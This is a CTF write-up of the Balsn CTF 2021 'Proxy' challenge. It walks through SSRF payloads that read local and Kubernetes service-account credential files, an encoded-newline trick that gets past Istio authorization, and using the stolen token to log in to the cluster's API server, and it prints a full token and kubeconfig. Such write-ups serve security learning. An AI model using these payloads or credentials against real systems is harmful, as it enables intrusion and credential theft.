# Balsn CTF 2021 - Proxy

## Summary

> Never Trust, Always Verify.
> 
> http://proxy.balsnctf.com
> 
> Flag is not a local file, you don't need to use any fuzzing tools.
> 
> Author: ysc
> Verifier: bookgin(3hr)
> Verifier: Kaibro(5hr)

**Points**: 291
**Solves**: 18/278

## Walkthrough

### Enumeration

Clicking into the link, the only thing you can see is this prompt:
```
/query?site=[your website]
```

So the first thing I checked is the external connectivity (well it is a proxy) , so lets see if it connects to Google:
```bash
curl -cv -o - http://proxy.balsnctf.com/query?site=https://google.com
```
Yes, it works!


I have also checked the common Linux paths and `/proc` tricks:
```
http://proxy.balsnctf.com/query?site=file:///etc/passwd

...
gg:x:1001:1001:Linux User,,,:/home/gg:/bin/sh
```

```
curl -cv --output - http://proxy.balsnctf.com/query?site=file:///proc/version  
Linux version 5.4.120+ (builder@cc55534de813) (Chromium OS 12.0_pre408248_p20201125-r7 clang version 12.0.0 (/var/tmp/portage/sys-devel/llvm-12.0_pre408248_p20201125-r7/work/llvm-12.0_pre408248_p20201125/clang f402e682d0ef5598eeffc9a21a691b03e602ff58)) #1 SMP Wed Aug 18 10:20:32 PDT 2021
```

Hmmm that kernel version is...

```
curl -cv --output - http://proxy.balsnctf.com/query?site=file:///proc/self/environ
CHALL_PORT=tcp://10.44.0.53:8000
CHALL_PORT_8000_TCP=tcp://10.44.0.53:8000
CHALL_PORT_8000_TCP_ADDR=10.44.0.53
CHALL_PORT_8000_TCP_PORT=8000
CHALL_PORT_8000_TCP_PROTO=tcp
PYTHON_PIP_VERSION=21.2.4
SHLVL=1
HOME=/home/gg
CHALL_SERVICE_HOST=10.44.0.53
CHALL_SERVICE_PORT=8000
CHALL_SERVICE_PORT_HTTP=8000
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
HOSTNAME=chall-v1-76d9c69984-rzj2b
KUBERNETES_PORT=tcp://10.44.0.1:443
KUBERNETES_PORT_443_TCP=tcp://10.44.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.44.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_HOST=10.44.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_SERVICE_PORT_HTTPS=443
LANG=C.UTF-8PYTHON_VERSION=3.10.0
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/opt/workdir
PYTHON_GET_PIP_SHA256=c518250e91a70d7b20cceb15272209a4ded2a0c263ae5776f129e0d9b5674309
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/3cb8888cc2869620f57d5d2da64da38f516078c7/public/get-pip.py
PYTHON_SETUPTOOLS_VERSION=57.5.0
SECRET_SERVICE_20A91E_PORT=tcp://10.44.3.240:39307
SECRET_SERVICE_20A91E_PORT_39307_TCP=tcp://10.44.3.240:39307
SECRET_SERVICE_20A91E_PORT_39307_TCP_ADDR=10.44.3.240
SECRET_SERVICE_20A91E_PORT_39307_TCP_PORT=39307
SECRET_SERVICE_20A91E_PORT_39307_TCP_PROTO=tcp
SECRET_SERVICE_20A91E_SERVICE_HOST=10.44.3.240
SECRET_SERVICE_20A91E_SERVICE_PORT=39307
SECRET_SERVICE_20A91E_SERVICE_PORT_HTTP=39307

firebird@ac96ad13d621:/proc/self$
```

```
curl -cv --output - http://proxy.balsnctf.com/query?site=file:///etc/hosts
10.40.0.6       chall-v1-76d9c69984-rzj2b
```

*Ummm it is Kubernetes on GKE? What is **SECRET_SERVICE_20A91E**?*

Checked other challenges and they are not hosted on Kubernetes, that means this challenge is something with Kubernetes... interesting!

So where is the sourcecode? With a bit of guessing we found the source code at `/proc/self/cwd/main.py` (somewhere in `/opt/workdir`)

```
http://proxy.balsnctf.com/query?site=file:///proc/self/cmdline

/usr/local/bin/python/usr/local/bin/gunicornmain:app--bind0.0.0.0:8000--workers5--worker-tmp-dir/dev/shm--worker-classgevent--access-logfile---error-logfile-
```

```py
curl -cv --output - http://proxy.balsnctf.com/query?site=file:///proc/self/cwd/main.py
import urllib.request

from flask import Flask, request

app = Flask(__name__)


@app.route("/meow")
def meow():
    return 'meow?'


@app.route("/query")
def query():
    site = request.args.get('site')
    text = urllib.request.urlopen(site, timeout=5).read()
    return text


@app.route("/")
def hello_world():
    return "/query?site=[your website]"


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=8000)
```

There is an hidden endpoint `/meow` in the application. Access the endpoint directly will throws `Access denied` error:

```bash
firebird@ac96ad13d621:/proc/self$ curl -cv --output - http://proxy.balsnctf.com/meow
RBAC: access denied
```

Searching the error message online revels that it is using [Istio](https://istio.io/) as the Kubernetes Ingress. I am not too familiar with Ingress **proxy** but it seems I am on the correct path. 

> **NOTE:** [Other writeups](https://blog.maple3142.net/2021/11/21/balsn-ctf-2021-writeups/) suggested that it is possible to dump the Istio config `http://127.0.0.1:15000/config_dump`

Could we authenticate with Kubernetes service account? By default all Pods have a default service account, mounted in the container (*you can disable this behavior with `automountServiceAccountToken: false`*). We can retrieve the service account token at `/run/secrets/kubernetes.io/serviceaccount/token` (see side notes), can we use it to authenticate with the proxy?

```bash
firebird@ac96ad13d621:/proc/self$ curl -H "Authorization: Bearer eyJhbGci...ru1EQ" http://proxy.balsnctf.com/meow
RBAC: access denied
```

No, we can't 🥲  How about access the `/meow` endpoint inside the container?

![f003e626e4ff9aaa6454da3d97faab3f.png](f003e626e4ff9aaa6454da3d97faab3f.png)

```bash
curl -cv --output - http://proxy.balsnctf.com/query?site=http://localhost:8000/meow
meow?
```

*Thank you!* That is the response from the source code 🥲

Meanwhile our teammate @Kaiziron found out that we can bypass the authentication with `%0a` (*Why?*), and show `meow?` directly.
![1824613336505b501f55b6b76f19bb05.png](1824613336505b501f55b6b76f19bb05.png)

In Kubernetes / Microservice arch, it is common to use route traffic using `path` with [Ingress](https://kubernetes.io/docs/concepts/services-networking/ingress/) proxy. It is very likely that `/meow` endpoint will route to the hidden service, therefore it needs authentication. We got the IP port pair `tcp://10.44.3.240:39307` of the hidden service with `environ`, but whatever we query it gives 500.

We tried it **very hard** and even logged in to the Kubernetes master with the service account (see side notes), but still no flag 🥲

### Solve

But wait, no one use IP address in Kubernetes! We always uses Cluster DNS name when communicating with other services / pods. From `environ` we know there are entries starting with `SECRET_SERVICE_20A91E`, therefore the service name is `secret-service-20a91e` (FQDN: `secret-service-20a91e.default.svc.cluster.local`), and in Kubernetes cluster this name is resolvable. Combining with the finding from @Kaiziron we got...

```bash
curl -o - http://proxy.balsnctf.com/query?site=http://secret-service-20a91e:39307/meow%250a
Please copy & paste this to discord: https://www.youtube.com/watch?v=SkgTxQm9DWM lor
```

![3828c939afd8f2dea5e3a0982ff54917.png](3828c939afd8f2dea5e3a0982ff54917.png)
now what?

```bash
curl -o - http://proxy.balsnctf.com/query?site=http://secret-service-20a91e:39307/%250a
here is your flag: <a href="/flag">/flag</a>
```

**Flags!**

## Questions left

- Why `%0a` or `/` can bypass Istio authentication?

## Side Notes - Access to Kubernetes Master

K8s Service Account token is accessible in the proxy.

```bash
firebird@ac96ad13d621:/proc/self$ curl -cv --output - http://proxy.balsnctf.com/query?site=file:///run/secrets/kubernetes.io/serviceaccount/ca.crt

-----BEGIN CERTIFICATE-----
MIIELDCCApSgAwIBAgIQB5VSGqW9xTNateZoZnHdjzANBgkqhkiG9w0BAQsFADAv
MS0wKwYDVQQDEyQ4OThlNTcxZS0zNmUyLTQyZTYtYWFmOS04OWZmN2M5NzBkNDUw
IBcNMjExMTE5MDkzMTEwWhgPMjA1MTExMTIxMDMxMTBaMC8xLTArBgNVBAMTJDg5
OGU1NzFlLTM2ZTItNDJlNi1hYWY5LTg5ZmY3Yzk3MGQ0NTCCAaIwDQYJKoZIhvcN
AQEBBQADggGPADCCAYoCggGBAJICaiVDNe9YMy+bsidD2WAxUWfGtHQULC1oR1cX
vJYAf/SnZVQXqgYa5Gya8WJnRA+uu1Z3gAMBSf7NEex9F+yatcjfJimayV0/Qtkd
nS7AcYST5HCWYXYUnG+vDM5Q0jvmHxqNLtbYoNy94Vz2x038qhl2Uos01mazRO26
0J7oCHvWrD0G5iWn2Su6CErr5d3QhXXtvTYudYvPI0wpjv/mrBIC9aZ2kM1E387h
cC5WyvQ4v87SXixpthFR+1jJ7mcQoNmJDovRQGvlDFL6uE0301VXdRuKNOfMNVQw
x7if62CyE5EydZQAEJJdWEzVeAacxtjsD0Du4R1Pzb79y0+9BnUh+moxGQeydDHt
+GgPaKB9jmNsrLZfwsBY5yzMN1ITVQ3eLJcPI7BG9W60GhZhgGJtuydbdIZkm/2h
6tKpQ470OXc0QhC2HlJgKm5ExxiEljI3ZRgpbCxBLOPt8Gt4W0BsDr74EZgdF4Jl
A9Uec+I6Rk8eWDsShizsmlNmIQIDAQABo0IwQDAOBgNVHQ8BAf8EBAMCAgQwDwYD
VR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUpVIShS+GBzPb194rR/C2ylBZevYwDQYJ
KoZIhvcNAQELBQADggGBABUbKRD64987NPOaDarkGjl6G0aVRfKwSrRl8bA9wDIp
+B9tKge0OVF0nztcM7D3DCKA0Dg8o67DAPay9zFmC/4Af/BEieaCS9/8xs0WnPV6
Sjfle3pIzhUZ5HyTHV676rEnsqYwud0CAFPq/fxkqNxL/55BCkMmEbl3YS+SoB1+
Mh1tS8Cp7rIy29zA5Yhu6Ru+juB8L7sVeF7Iq4HV0ZDURGadM2Gh6U/MOISb6TNH
7sTu18Dq83JCt+0o6YmyW0ivUC+U0gDt+zmsKdBucdIg+jSlsP/9bKYMz0ORpp/d
8vgTuqUYJhflPzQFi5xYqoQGAHreh1QPNRozf6OmoeJZ4TlRdZlVMRL/x7sc9zVB
U1F7LB3U8aNFGRJJmcowoVQRebUZwiDHjUqn5Z3Xre4gc1WX/8DddlvMRd/hn8+j
XOxN5Jf9xArlNyQaNm7SnHvThbGT9QgJTCmbASQOyK+kDSpkl6Q+paOD0GGjdyyQ
JdSFRTU4TsJH4EcDxA0qFw==
-----END CERTIFICATE-----

# which translate to...

Basic Fields
  serial number: 0795521aa5bdc5335ab5e6686671dd8f
  signature algorithm: SHA256withRSA
  issuer: /CN=898e571e-36e2-42e6-aaf9-89ff7c970d45
  notBefore: 211119093110Z
  notAfter: 20511112103110Z
  subject: /CN=898e571e-36e2-42e6-aaf9-89ff7c970d45
  subject public key info: 
    key algorithm: RSA
    n=0092026a254335ef...
    e=010001
X509v3 Extensions:
  keyUsage CRITICAL:
    keyCertSign
  basicConstraints CRITICAL:
    cA=true
  subjectKeyIdentifier :
    a55212852f860733dbd7de2b47f0b6ca50597af6
signature algorithm: SHA256withRSA
signature: 151b2910fae3df3b...

SerialNumber:	0795521aa5bdc5335ab5e6686671dd8f
SHA1 Thumb Print:	b8a0662f55d6f6888538af0d9d64450d345fbac9
```

With the issuer CN `898e571e-36e2-42e6-aaf9-89ff7c970d45`, we can search on the Internet for exposed Kubernetes master  (e.g. [Censys](https://search.censys.io/search?resource=hosts&q=services.tls.certificates.leaf_data.issuer.common_name%3A%22898e571e-36e2-42e6-aaf9-89ff7c970d45%22) or [Shodan](https://www.shodan.io/search?query=ssl.cert.issuer.cn%3A%22898e571e-36e2-42e6-aaf9-89ff7c970d45%22)) and locate the API server.

```bash
firebird@ac96ad13d621:/proc/self$ curl -cv --output - http://proxy.balsnctf.com/query?site=file:///run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IjE1WVE0T0ctYUFaeWtfTXN0ejgtbmNaMlpJMUVpQ1ZPTkNjNEpQLUh3YWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InNhLWNoYWxsLXRva2VuLTRrcjRjIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InNhLWNoYWxsIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYzIyMTczYzktNzU3NC00ZDMyLWIwZDMtYTVlZWYwY2U1ZTU3Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2EtY2hhbGwifQ.jvDsvC2Hc1elQQ6hwmp8qjN496f2Mgxdoa17I-g52T_m5Veg5c9Icia-RzsRu-RfGh0yfHFJJUA0Bd7eyeVyckeOqcsZ8LfBG9wAyq5Sbg-OJDEq81_bQ7922NxXi_wYzNktBtvKVRtA3fzKaUdxcnH11_KxwUaGz7TZCBFsLsBKbLGFZideDuj37iMOUl6fRptVD46pZhXPLcv5uC61NKiP-hUoaTFgZ8dcGvg9Brgo6ynwgGQDlK8xk78BIsUhMv4bb9JkUDctmiUAhuCssWCA--yvaw0nE_boa8JtMEbTmwFGznGKWJVSIT-W0Cu3jmdO34Scxs3r-KlVhru1EQ

# Payload contains...

{
  "iss": "kubernetes/serviceaccount",
  "kubernetes.io/serviceaccount/namespace": "default",
  "kubernetes.io/serviceaccount/secret.name": "sa-chall-token-4kr4c",
  "kubernetes.io/serviceaccount/service-account.name": "sa-chall",
  "kubernetes.io/serviceaccount/service-account.uid": "c22173c9-7574-4d32-b0d3-a5eef0ce5e57",
  "sub": "system:serviceaccount:default:sa-chall"
}
```

Then we can login to the master with the service account token.

```yaml
apple@debian:~/$ cat ~/.kube/config

apiVersion: v1
clusters:
- cluster:
    insecure-skip-tls-verify: true
    server: https://35.194.230.23
  name: test
contexts:
- context:
    cluster: test
    namespace: default
    user: sachall
  name: default
current-context: default
kind: Config
preferences: {}
users:
- name: sachall
  user:
    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IjE1WVE0T0ctYUFaeWtfTXN0ejgtbmNaMlpJMUVpQ1ZPTkNjNEpQLUh3YWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InNhLWNoYWxsLXRva2VuLTRrcjRjIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InNhLWNoYWxsIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYzIyMTczYzktNzU3NC00ZDMyLWIwZDMtYTVlZWYwY2U1ZTU3Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2EtY2hhbGwifQ.jvDsvC2Hc1elQQ6hwmp8qjN496f2Mgxdoa17I-g52T_m5Veg5c9Icia-RzsRu-RfGh0yfHFJJUA0Bd7eyeVyckeOqcsZ8LfBG9wAyq5Sbg-OJDEq81_bQ7922NxXi_wYzNktBtvKVRtA3fzKaUdxcnH11_KxwUaGz7TZCBFsLsBKbLGFZideDuj37iMOUl6fRptVD46pZhXPLcv5uC61NKiP-hUoaTFgZ8dcGvg9Brgo6ynwgGQDlK8xk78BIsUhMv4bb9JkUDctmiUAhuCssWCA--yvaw0nE_boa8JtMEbTmwFGznGKWJVSIT-W0Cu3jmdO34Scxs3r-KlVhru1EQ
```


![53f9ce324dc42bffb3f15c6bc005e274.png](53f9ce324dc42bffb3f15c6bc005e274.png)

And... there is nothing I can do with the account (except revealing the GCP Project ID etc, which were useless 🥲)

![9fe7fdf41a0db049919072d72059784d.png](9fe7fdf41a0db049919072d72059784d.png)

🥲

![25ad13ff2ac25f1753efacd4788f910b.png](25ad13ff2ac25f1753efacd4788f910b.png)

Thank you @ysc for the fun challenge!